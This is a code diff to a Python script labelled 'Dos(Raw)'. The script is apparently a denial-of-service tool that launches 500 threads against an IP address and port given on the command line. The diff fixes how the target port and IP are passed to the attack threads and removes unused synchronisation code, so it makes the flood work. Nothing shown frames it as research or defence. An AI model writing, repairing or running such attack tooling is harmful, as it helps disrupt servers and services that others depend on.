@@ -4,6 +4,7 @@ Dos(Raw)
 import socket
 import subprocess as sub
 import threading,sys
+ip = ''
 def DosP():    
     while True:
         try:
@@ -32,6 +33,7 @@ def Dos(ip,port):
     
 
 def CheckIps(port):
+    global ip
     n = 500
     
     e = []
@@ -60,27 +62,18 @@ def CheckIps(port):
             except:
                 pass
     else:    
-        for i in range(n+1):
-            e.append(threading.Event())
         for i in range(n):
-            t.append(threading.Thread(target = Dos, args=(ip,PR)))
-
+            t.append(threading.Thread(target = Dos, args=(ip,port)))
         for i in range(n):
             try:
                 t[i].start()
             except:
                 pass
         for i in range(n):
-            try:        
-                e[i].set()
-            except:
-                pass
-        for i in range(n):
-            try:        
+            try:
                 t[i].join()
             except:
                 pass
-    
 try:
     if sys.argv[1] == '-p':
         IP = sys.argv[2]
